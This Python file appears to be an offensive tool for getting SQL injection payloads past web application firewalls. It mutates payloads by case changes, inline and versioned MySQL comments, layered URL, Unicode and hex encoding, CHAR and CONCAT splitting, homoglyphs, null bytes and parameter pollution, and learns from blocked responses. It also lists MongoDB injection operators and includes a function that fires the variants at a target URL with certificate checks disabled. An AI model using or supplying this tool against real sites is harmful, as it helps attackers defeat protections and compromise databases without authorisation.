import base64
import random
import urllib.parse
import re
from urllib.parse import quote, quote_plus, unquote

class AdvancedWAFBypass:
    def __init__(self):
        self.bypass_methods = {
            'case_manipulation': self.case_manipulation,
            'whitespace_obfuscation': self.whitespace_obfuscation,
            'encoding_techniques': self.encoding_techniques,
            'comment_obfuscation': self.comment_obfuscation,
            'string_concatenation': self.string_concatenation,
            'parameter_pollution': self.parameter_pollution,
            'protocol_level': self.protocol_level_bypass,
            'advanced_comments': self.advanced_comment_techniques,
            'keyword_splitting': self.keyword_splitting,
            'null_bytes': self.null_bytes_injection,
            'unicode_obfuscation': self.unicode_obfuscation,
            'template_injection': self.template_injection,
            'chunked_encoding': self.chunked_encoding_bypass,
            'multiple_encoding': self.multiple_encoding,
            'sql_char_function': self.sql_char_function,
            'hex_encoding': self.hex_encoding,
            'comment_advanced': self.comment_advanced_techniques
        }
        
        # Common SQL keywords to target
        self.sql_keywords = [
            'SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 
            'UPDATE', 'DELETE', 'DROP', 'CREATE', 'ALTER', 'EXEC', 
            'EXECUTE', 'DECLARE', 'XP_', 'SP_', 'TABLE', 'COLUMN',
            'DATABASE', 'SCHEMA', 'PROCEDURE', 'FUNCTION', 'TRIGGER'
        ]
        
        # WAF evasion patterns
        self.evasion_patterns = [
            (' ', ['/**/', '/*!*/', '/*!50000*/', '/*x*/', '/*123*/']),
            ("'", ["%27", "%u0027", "%u02b9", "%u02bc", "%uff07", "&#39;", "&#x27;"]),
            ('"', ["%22", "%u0022", "%uff02", "&#34;", "&#x22;"]),
            ('=', ["%3D", "%u003D", " LIKE ", " IN ", ">0", "<>''"]),
            ('(', ["%28", "%u0028"]),
            (')', ["%29", "%u0028"]),
        ]
    
    def case_manipulation(self, payload):
        """Advanced case manipulation techniques"""
        variations = []
        
        # 1. Random case (most common)
        random_case = ''.join(
            char.upper() if random.choice([True, False]) else char.lower()
            for char in payload
        )
        variations.append(random_case)
        
        # 2. Alternate case
        alternate = ''.join(
            char.upper() if i % 2 == 0 else char.lower()
            for i, char in enumerate(payload)
        )
        variations.append(alternate)
        
        # 3. First letter uppercase only
        first_upper = ' '.join(
            word[0].upper() + word[1:].lower() if word.isalpha() else word
            for word in payload.split()
        )
        variations.append(first_upper)
        
        # 4. Mixed case for specific keywords only
        mixed_keywords = payload
        for keyword in self.sql_keywords:
            if keyword.upper() in payload.upper():
                # Randomize case for each occurrence
                mixed_keywords = mixed_keywords.replace(
                    keyword, 
                    self._randomize_case(keyword)
                )
        variations.append(mixed_keywords)
        
        # 5. All uppercase (surprisingly effective against some WAFs)
        variations.append(payload.upper())
        
        # 6. All lowercase
        variations.append(payload.lower())
        
        return variations
    
    def _randomize_case(self, text):
        """Randomize case of a string with more intelligence"""
        return ''.join(
            char.upper() if random.random() > 0.5 else char.lower()
            for char in text
        )
    
    def whitespace_obfuscation(self, payload):
        """Advanced whitespace obfuscation"""
        variations = []
        
        whitespace_chars = [
            ' ', '\t', '\n', '\r', '\x0b', '\x0c',
            '​', '﻿', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ',
            '\u2000', '\u2001', '\u2002', '\u2003', '\u2004', '\u2005', 
            '\u2006', '\u2007', '\u2008', '\u2009', '\u200a', '\u200b'
        ]
        
        # Replace spaces with various whitespace characters
        for ws_char in whitespace_chars[:8]:  # Use first 8 to avoid too many variations
            variations.append(payload.replace(' ', ws_char))
        
        # Multiple spaces
        variations.append(payload.replace(' ', '  '))
        variations.append(payload.replace(' ', '   '))
        
        # Mixed whitespace
        mixed_ws = payload
        for i, char in enumerate(payload):
            if char == ' ':
                mixed_ws = mixed_ws[:i] + random.choice(whitespace_chars) + mixed_ws[i+1:]
        variations.append(mixed_ws)
        
        # No spaces (concatenated)
        variations.append(payload.replace(' ', ''))
        
        # Tab and newline combinations
        variations.append(payload.replace(' ', '\t\n'))
        variations.append(payload.replace(' ', '\n\t'))
        
        return variations
    
    def encoding_techniques(self, payload):
        """Advanced encoding techniques"""
        variations = []
        
        # 1. URL encoding (selective)
        selective_encoded = ''.join(
            f'%{ord(char):02x}' if char in ' \'"=<>()&|;' else char
            for char in payload
        )
        variations.append(selective_encoded)
        
        # 2. Double URL encoding
        double_encoded = ''.join(
            f'%25{ord(char):02x}' if char in ' \'"=<>()&|;' else char
            for char in payload
        )
        variations.append(double_encoded)
        
        # 3. Full URL encoding
        variations.append(urllib.parse.quote(payload))
        variations.append(urllib.parse.quote_plus(payload))
        
        # 4. Unicode encoding variations
        unicode_variants = {
            "'": ["%u0027", "%u02b9", "%u02bc", "%uff07", "%u2018", "%u2019"],
            '"': ["%u0022", "%uff02", "%u201c", "%u201d"],
            ' ': ["%u0020", "%u00a0", "%u2000", "%u2001"],
            '<': ["%u003c", "%uff1c"],
            '>': ["%u003e", "%uff1e"],
            '=': ["%u003d", "%uff1d"]
        }
        
        for char, encodings in unicode_variants.items():
            if char in payload:
                for encoding in encodings[:2]:  # Limit variations
                    variations.append(payload.replace(char, encoding))
        
        # 5. HTML entity encoding
        html_entities = {
            "'": ["&#39;", "&#x27;", "&apos;"],
            '"': ["&#34;", "&#x22;", "&quot;"],
            '<': ["&lt;", "&#60;", "&#x3c;"],
            '>': ["&gt;", "&#62;", "&#x3e;"],
            '&': ["&amp;", "&#38;", "&#x26;"]
        }
        
        for char, entities in html_entities.items():
            if char in payload:
                for entity in entities[:2]:
                    variations.append(payload.replace(char, entity))
        
        # 6. Mixed encoding
        mixed_encoded = payload
        for char in mixed_encoded:
            if char in " '\"=<>":
                if random.choice([True, False]):
                    mixed_encoded = mixed_encoded.replace(char, f'%{ord(char):02x}', 1)
        variations.append(mixed_encoded)
        
        # 7. Base64 encoding for parts
        try:
            # Encode only the SQL part, keep delimiters
            if "'" in payload:
                parts = payload.split("'", 1)
                if len(parts) > 1:
                    sql_part = parts[1].split('--')[0] if '--' in parts[1] else parts[1]
                    base64_sql = base64.b64encode(sql_part.encode()).decode()
                    variations.append(f"{parts[0]}'{base64_sql}'")
        except:
            pass
        
        return variations
    
    def comment_obfuscation(self, payload):
        """Advanced comment-based obfuscation"""
        variations = []
        
        comment_styles = [
            '/**/', '/*!*/', '/*!50000*/', '/*x*/', '/*123*/', '/*!12345*/',
            '/*-------------*/', '/*!00000*/', '/*! SQL */', '/*! MySQL */'
        ]
        
        # Insert comments between keywords
        for comment in comment_styles:
            # Between SQL keywords
            variations.append(payload.replace('UNION', f'UNI{comment}ON'))
            variations.append(payload.replace('SELECT', f'SEL{comment}ECT'))
            variations.append(payload.replace('FROM', f'FR{comment}OM'))
            variations.append(payload.replace('WHERE', f'WH{comment}ERE'))
            variations.append(payload.replace('AND', f'AN{comment}D'))
            variations.append(payload.replace('OR', f'O{comment}R'))
        
        # Multiple comments in sequence
        variations.append(payload.replace('SELECT', 'SEL/*x*//*y*/ECT'))
        variations.append(payload.replace('UNION', 'UNI/*a*//*b*/ON'))
        
        # Comments with version specificity
        mysql_versions = ['50000', '50001', '50002', '50100', '50500', '50600', '50700', '50800']
        for version in random.sample(mysql_versions, 3):
            variations.append(payload.replace('SELECT', f'/*!{version}SELECT*/'))
            variations.append(payload.replace('UNION', f'/*!{version}UNION*/'))
        
        # Inline comments replacing spaces
        variations.append(payload.replace(' ', '/**/'))
        variations.append(payload.replace(' ', '/*!*/'))
        
        return variations
    
    def string_concatenation(self, payload):
        """Advanced string concatenation techniques"""
        variations = []
        
        # MySQL CONCAT function
        variations.append(payload.replace("version()", "CONCAT(@@version)"))
        variations.append(payload.replace("database()", "CONCAT('dat','abase')"))
        variations.append(payload.replace("user()", "CONCAT(us,'er',())"))
        
        # Split strings with concatenation
        variations.append(payload.replace("admin", "CONCAT('ad','min')"))
        variations.append(payload.replace("or 1=1", "or CONCAT('1','=','1')"))
        variations.append(payload.replace("union", "CONCAT('un','ion')"))
        variations.append(payload.replace("select", "CONCAT('sel','ect')"))
        
        # CHAR function for complete obfuscation
        if "version" in payload.lower():
            char_version = "CHAR(" + ",".join(str(ord(c)) for c in "version") + ")"
            variations.append(payload.replace("version", char_version))
        
        if "database" in payload.lower():
            char_database = "CHAR(" + ",".join(str(ord(c)) for c in "database") + ")"
            variations.append(payload.replace("database", char_database))
        
        # Mixed concatenation
        variations.append(payload.replace("SELECT", "CONCAT('SEL','ECT')"))
        variations.append(payload.replace("FROM", "CONCAT('FR','OM')"))
        
        # Hex string concatenation
        if len(payload) < 100:  # Only for reasonable lengths
            hex_payload = "0x" + payload.encode('utf-8').hex()
            variations.append(hex_payload)
        
        return variations
    
    def keyword_splitting(self, payload):
        """Split keywords in creative ways"""
        variations = []
        
        split_patterns = [
            ('SELECT', ['SEL' + 'ECT', 'S' + 'ELECT', 'SE' + 'LECT']),
            ('UNION', ['UNI' + 'ON', 'U' + 'NION', 'UN' + 'ION']),
            ('FROM', ['FR' + 'OM', 'F' + 'ROM']),
            ('WHERE', ['WHE' + 'RE', 'WH' + 'ERE']),
            ('AND', ['A' + 'ND']),
            ('OR', ['O' + 'R'])
        ]
        
        for keyword, splits in split_patterns:
            if keyword in payload:
                for split in splits:
                    variations.append(payload.replace(keyword, split))
        
        # Advanced splitting with multiple techniques
        advanced_split = payload
        for keyword in self.sql_keywords:
            if keyword in advanced_split:
                # Split at random position
                split_pos = random.randint(1, len(keyword)-1)
                split_keyword = keyword[:split_pos] + '/*x*/' + keyword[split_pos:]
                advanced_split = advanced_split.replace(keyword, split_keyword)
        variations.append(advanced_split)
        
        return variations
    
    def null_bytes_injection(self, payload):
        """Use null bytes and special characters"""
        variations = []
        
        null_bytes = ['%00', '\x00', '\0']
        special_chars = ['%0a', '%0d', '%09', '%0b', '%0c']
        
        # Insert null bytes before payload
        for null_byte in null_bytes:
            variations.append(null_byte + payload)
        
        # Insert special characters in keywords
        for special in special_chars:
            modified = payload.replace('SELECT', f'SEL{special}ECT')
            modified = modified.replace('UNION', f'UNI{special}ON')
            variations.append(modified)
        
        # Null byte in the middle
        if len(payload) > 5:
            mid_pos = len(payload) // 2
            variations.append(payload[:mid_pos] + '%00' + payload[mid_pos:])
        
        return variations
    
    def unicode_obfuscation(self, payload):
        """Advanced Unicode normalization attacks"""
        variations = []
        
        # Unicode homoglyphs
        homoglyphs = {
            'a': ['а', 'ɑ', 'а'],  # Cyrillic, Greek, etc.
            'e': ['е', 'ё', 'е'],  # Cyrillic
            'o': ['о', 'ο', 'о'],  # Cyrillic, Greek
            'i': ['і', 'і', 'і'],  # Cyrillic
            's': ['ѕ', 'ѕ'],       # Cyrillic
            'c': ['с', 'с'],       # Cyrillic
        }
        
        # Replace characters with homoglyphs
        for original, replacements in homoglyphs.items():
            if original in payload.lower():
                for replacement in replacements:
                    homoglyph_payload = payload.replace(original, replacement)
                    homoglyph_payload = homoglyph_payload.replace(original.upper(), replacement.upper())
                    variations.append(homoglyph_payload)
        
        # Unicode normalization forms
        unicode_payload = payload
        for i, char in enumerate(unicode_payload):
            if char in "SELECTUNIONFROMWHEREANDOR":
                # Randomly replace with similar unicode
                if random.random() < 0.3:
                    unicode_payload = unicode_payload[:i] + chr(ord(char) + 65248) + unicode_payload[i+1:]
        variations.append(unicode_payload)
        
        return variations
    
    def multiple_encoding(self, payload):
        """Apply multiple encoding layers"""
        variations = []
        
        # URL encode then HTML encode
        url_encoded = urllib.parse.quote(payload)
        html_encoded = url_encoded.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        variations.append(html_encoded)
        
        # Double URL encoding
        double_url = urllib.parse.quote(urllib.parse.quote(payload))
        variations.append(double_url)
        
        # Mixed encoding
        mixed = payload
        encoding_steps = [
            lambda x: x.replace("'", "%27"),
            lambda x: x.replace("%27", "&#37;27"),
            lambda x: x.replace("SELECT", "SEL%45CT"),
        ]
        
        for step in encoding_steps:
            mixed = step(mixed)
        variations.append(mixed)
        
        return variations
    
    def sql_char_function(self, payload):
        """Use SQL CHAR function to obfuscate"""
        variations = []
        
        # Convert entire string to CHAR function
        if len(payload) < 50:
            char_codes = []
            for char in payload:
                if char.isalnum() or char in " '=()-":
                    char_codes.append(str(ord(char)))
                else:
                    char_codes.append(f"'{char}'")
            
            char_function = "CHAR(" + ",".join(char_codes) + ")"
            variations.append(char_function)
        
        # Partial CHAR encoding for keywords only
        char_payload = payload
        for keyword in self.sql_keywords:
            if keyword in char_payload:
                char_version = "CHAR(" + ",".join(str(ord(c)) for c in keyword) + ")"
                char_payload = char_payload.replace(keyword, char_version)
        variations.append(char_payload)
        
        return variations
    
    def hex_encoding(self, payload):
        """Advanced hex encoding techniques"""
        variations = []
        
        # Full hex encoding
        hex_full = "0x" + payload.encode('utf-8').hex()
        variations.append(hex_full)
        
        # Partial hex encoding for strings
        hex_payload = payload
        string_patterns = ["'admin'", "'password'", "'version'", "'database'"]
        
        for pattern in string_patterns:
            if pattern in hex_payload:
                hex_string = "0x" + pattern.encode('utf-8').hex()
                hex_payload = hex_payload.replace(pattern, hex_string)
        variations.append(hex_payload)
        
        # Hex for specific keywords
        for keyword in ['SELECT', 'UNION', 'FROM']:
            if keyword in payload:
                hex_keyword = "0x" + keyword.encode('utf-8').hex()
                variations.append(payload.replace(keyword, hex_keyword))
        
        return variations
    
    def comment_advanced_techniques(self, payload):
        """Advanced comment techniques"""
        variations = []
        
        # Nested comments
        variations.append(payload.replace('SELECT', 'SEL/*/*/**/*/ECT'))
        variations.append(payload.replace('UNION', 'UNI/*/*/*/ON'))
        
        # Conditional comments with expressions
        variations.append(payload.replace('SELECT', '/*!50000SELECT*/'))
        variations.append(payload.replace('UNION', '/*!UNION*/'))
        
        # Version-specific comments with random versions
        versions = ['40000', '40100', '50000', '50100', '50500', '50600', '50700', '50800']
        for version in random.sample(versions, 3):
            variations.append(f"/*!{version} {payload} */")
        
        # Comments with special characters
        special_comments = ['/*! */', '/*!12345*/', '/*!00000*/', '/*! MySQL */']
        for comment in special_comments:
            commented_payload = payload.replace(' ', f' {comment} ')
            variations.append(commented_payload)
        
        return variations
    
    def parameter_pollution(self, param_name, payload):
        """HTTP Parameter Pollution techniques"""
        variations = []
        
        # Multiple parameters with same name
        variations.append(f"{param_name}=legit&{param_name}={payload}")
        variations.append(f"{param_name}={payload}&{param_name}=legit")
        
        # Array parameters
        variations.append(f"{param_name}[]=legit&{param_name}[]={payload}")
        
        # Different parameter locations
        variations.append(f"{param_name}=legit&other={payload}")
        variations.append(f"other=test&{param_name}={payload}")
        
        # JSON parameter pollution
        variations.append(f'{{"{param_name}": "legit", "{param_name}": "{payload}"}}')
        variations.append(f'{{"data": {{"{param_name}": "{payload}"}}}}')
        
        return variations
    
    def protocol_level_bypass(self, payload):
        """Protocol-level WAF bypass techniques"""
        variations = []
        
        # HTTP method override
        variations.append(f"POST _method=PUT&{payload}")
        variations.append(f"GET X-HTTP-Method-Override=POST&{payload}")
        
        # Chunked transfer encoding
        variations.append(f"Transfer-Encoding: chunked\n\n{len(payload):x}\n{payload}\n0\n\n")
        
        # Gzip compression bypass
        variations.append(f"Content-Encoding: gzip\n{payload}")
        
        # HTTP/2 pseudo-headers
        variations.append(f":method GET\n:path /?{payload}\n:authority example.com")
        
        return variations
    
    def template_injection(self, payload):
        """Template injection style bypasses"""
        variations = []
        
        # SQL template style
        variations.append(payload.replace("1=1", "${1=1}"))
        variations.append(payload.replace("OR 1=1", "OR ${1=1}"))
        
        # Expression language
        variations.append(payload.replace("1=1", "#{1==1}"))
        variations.append(payload.replace("'admin'", "#{'admin'}"))
        
        return variations
    
    def chunked_encoding_bypass(self, payload):
        """Chunked encoding transfer bypass"""
        variations = []
        
        # Split payload into chunks
        chunk_size = 5
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        
        chunked_payload = ""
        for chunk in chunks:
            chunked_payload += f"{len(chunk):x}\r\n{chunk}\r\n"
        chunked_payload += "0\r\n\r\n"
        
        variations.append(chunked_payload)
        return variations
    
    def apply_all_bypasses(self, payload, max_variations=15):
        """Apply all bypass techniques with intelligent combination"""
        all_variations = [payload]  # Always include original
        
        # Apply individual techniques
        for method_name, method in self.bypass_methods.items():
            try:
                if method_name == 'parameter_pollution':
                    variations = method('id', payload)
                else:
                    variations = method(payload)
                all_variations.extend(variations)
            except Exception as e:
                print(f"⚠️ Error in {method_name}: {e}")
                continue
        
        # Apply combined techniques (2-layer)
        combined_variations = self._apply_combined_techniques(payload)
        all_variations.extend(combined_variations)
        
        # Remove duplicates and limit
        unique_variations = list(set(all_variations))
        
        # Prioritize variations that are most different from original
        scored_variations = []
        for variation in unique_variations:
            if variation == payload:
                score = 0
            else:
                # Score based on how different it is
                score = self._calculate_bypass_score(payload, variation)
            scored_variations.append((score, variation))
        
        # Sort by bypass score (highest first)
        scored_variations.sort(reverse=True, key=lambda x: x[0])
        
        # Return top variations
        return [v for _, v in scored_variations[:max_variations]]
    
    def _apply_combined_techniques(self, payload):
        """Apply 2-3 techniques in combination"""
        combined = []
        
        # Popular combinations
        combinations = [
            ['case_manipulation', 'comment_obfuscation'],
            ['encoding_techniques', 'whitespace_obfuscation'],
            ['string_concatenation', 'case_manipulation'],
            ['comment_obfuscation', 'encoding_techniques'],
            ['hex_encoding', 'comment_obfuscation'],
        ]
        
        for combo in combinations:
            try:
                result = payload
                for technique in combo:
                    method = self.bypass_methods[technique]
                    variations = method(result)
                    if variations:
                        result = random.choice(variations)
                combined.append(result)
            except:
                continue
        
        return combined
    
    def _calculate_bypass_score(self, original, variation):
        """Calculate how effective a bypass variation is"""
        score = 0
        
        # Length difference
        length_diff = abs(len(original) - len(variation))
        score += min(length_diff, 10)
        
        # Character set difference
        orig_chars = set(original)
        var_chars = set(variation)
        diff_chars = len(var_chars - orig_chars)
        score += diff_chars * 2
        
        # Encoding patterns
        if '%' in variation:
            score += 5
        if '/*' in variation:
            score += 3
        if 'CHAR(' in variation:
            score += 4
        if '0x' in variation and '0x' not in original:
            score += 3
        
        # Case variation
        if original.lower() != variation.lower():
            score += 2
        
        return score


class SmartWAFBypass:
    """Intelligent WAF bypass that learns from responses"""
    
    def __init__(self):
        self.technique_success_rates = {}
        self.blocked_patterns = set()
        self.successful_payloads = set()
    
    def analyze_response(self, payload, response_code, response_body):
        """Analyze response to learn WAF behavior"""
        waf_indicators = [
            'waf', 'firewall', 'blocked', 'security', 'forbidden',
            '403', 'not allowed', 'suspicious', 'malicious'
        ]
        
        is_blocked = any(indicator in response_body.lower() for indicator in waf_indicators)
        is_blocked = is_blocked or response_code in [403, 406, 418]
        
        if is_blocked:
            self.blocked_patterns.add(payload)
        else:
            self.successful_payloads.add(payload)
    
    def get_optimized_bypass(self, original_payload, bypass_engine):
        """Get bypass payloads optimized based on previous learning"""
        all_variations = bypass_engine.apply_all_bypasses(original_payload)
        
        # Filter out previously blocked patterns
        filtered_variations = [
            p for p in all_variations 
            if not any(blocked in p for blocked in self.blocked_patterns)
        ]
        
        # Prioritize techniques that worked before
        successful_techniques = set()
        for successful in self.successful_payloads:
            for technique in bypass_engine.bypass_methods.keys():
                if self._payload_uses_technique(successful, technique):
                    successful_techniques.add(technique)
        
        # Reorder based on successful techniques
        prioritized = []
        other_variations = []
        
        for variation in filtered_variations:
            uses_successful = any(
                self._payload_uses_technique(variation, technique)
                for technique in successful_techniques
            )
            if uses_successful:
                prioritized.append(variation)
            else:
                other_variations.append(variation)
        
        return prioritized + other_variations
    
    def _payload_uses_technique(self, payload, technique):
        """Check if payload uses specific bypass technique"""
        technique_indicators = {
            'case_manipulation': lambda p: p != p.upper() and p != p.lower(),
            'comment_obfuscation': lambda p: '/*' in p or '/**/' in p,
            'encoding_techniques': lambda p: '%' in p or '&#' in p,
            'hex_encoding': lambda p: '0x' in p.upper(),
            'string_concatenation': lambda p: 'CONCAT' in p or 'CHAR(' in p,
        }
        
        if technique in technique_indicators:
            return technique_indicators[technique](payload)
        return False


class NoSQLInjection:
    def mongo_injection(self):
        return [
            '{$ne:null}',
            '{"$gt":""}',
            '{"username":{"$ne":null}}',
            '{"password":{"$ne":null}}'
        ]

    def json_injection(self):
        return [
            '{"$where":"1==1"}',
            '{"$or":[{},{"x":"y"}]}'
        ]



# Utility functions
def generate_smart_bypass_payloads(payloads, max_variations=10, learning_engine=None):
    """Generate intelligent WAF bypass variants"""
    bypass = AdvancedWAFBypass()
    smart_bypass = learning_engine or SmartWAFBypass()
    
    bypassed_payloads = []
    
    for payload in payloads:
        if learning_engine:
            variants = smart_bypass.get_optimized_bypass(payload, bypass)
        else:
            variants = bypass.apply_all_bypasses(payload, max_variations)
        
        bypassed_payloads.extend(variants)
    
    return list(set(bypassed_payloads))


def test_waf_bypass(url, payloads, headers=None):
    """Test WAF bypass against a target"""
    import requests
    
    results = {
        'blocked': [],
        'bypassed': [],
        'errors': []
    }
    
    for payload in payloads:
        try:
            response = requests.get(
                f"{url}?id={payload}", 
                headers=headers,
                timeout=10,
                verify=False
            )
            
            # Simple WAF detection
            waf_indicators = ['waf', 'blocked', 'forbidden', 'security']
            is_blocked = any(indicator in response.text.lower() for indicator in waf_indicators)
            is_blocked = is_blocked or response.status_code in [403, 406]
            
            if is_blocked:
                results['blocked'].append(payload)
            else:
                results['bypassed'].append(payload)
                
        except Exception as e:
            results['errors'].append(f"{payload}: {e}")
    
    return results